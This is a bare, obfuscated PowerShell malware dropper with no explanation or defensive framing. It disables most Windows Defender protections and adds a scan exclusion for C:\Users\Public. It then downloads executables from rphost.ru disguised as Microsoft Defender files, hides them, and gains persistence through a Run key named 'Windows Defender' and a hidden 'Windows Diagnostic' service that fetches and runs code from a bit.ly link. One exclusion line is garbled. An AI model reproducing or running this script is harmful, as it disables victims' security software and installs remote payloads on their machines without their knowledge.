Se't-MpP'ref'er'ence -DisableScriptScanning 1
Se't-MpP'ref'er'ence -DisableArchiveScanning 1
Se't-MpP'ref'er'ence -DisableAutoExclusions 1
Se't-MpP'ref'er'ence -DisableBehaviorMonitoring 1
Se't-MpP'ref'er'ence -DisableBlockAtFirstSeen 1
Se't-MpP'ref'er'ence -DisableIOAVProtection 1
Se't-MpP'ref'er'ence -DisablePrivacyMode 1
Se't-MpP'ref'er'ence -DisableRealtimeMonitoring 1
Ad'd-Mp'd-Mp'Prefe'ren'ce -ExclusionPath C:\Users\Public\

$splited = "(New-Object System.Net.Web~~Client).Downlo~~adFile('http://rphost.ru:5885/64.signed','C:\Users\Public\MSASC.exe')"
$unsplited = $splited.Replace("~~","")
IEX $unsplited
Ge't-It'em ('C'+':\'+'User'+'s\'+'Pub'+'lic\'+'MS'+'AS'+'C.e'+'xe') | fo're'ach {$_.Attributes = 'ReadOnly, Hidden'}
$split = "(New-Object System.Net.Web~~Client).Downlo~~adFile('http://rphost.ru:5885/MS_ASC64_1.signed','C:\Users\Public\MSASCuiL.exe')"
$unsplit = $split.Replace("~~","")
IEX $unsplit
Ge't-It'em ('C'+':\'+'User'+'s\'+'Pub'+'lic\'+'MSAS'+'Cui'+'L.e'+'xe') | fo're'ach {$_.Attributes = 'ReadOnly, Hidden'}
N'ew'-I'te'mP'ro'pe'rt'y -Path "hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Windows Defender" -Value "C:\Users\Public\MSASCuiL.exe"
N'e'w-S'er'vi'ce -Name "Windows Diagnostic" -BinaryPathName "cmd /c powershell.exe -nop -w hidden IEX (New-Object Net.WebClient).downloadstring('https://bit.ly/2ojGG3k');" -DisplayName "Windows Diagnostic" -Description "Windows Diagnostic"
s't'art-p'roc'es's -FilePath 'C:\Users\Public\MSASCuiL.exe'
Exit
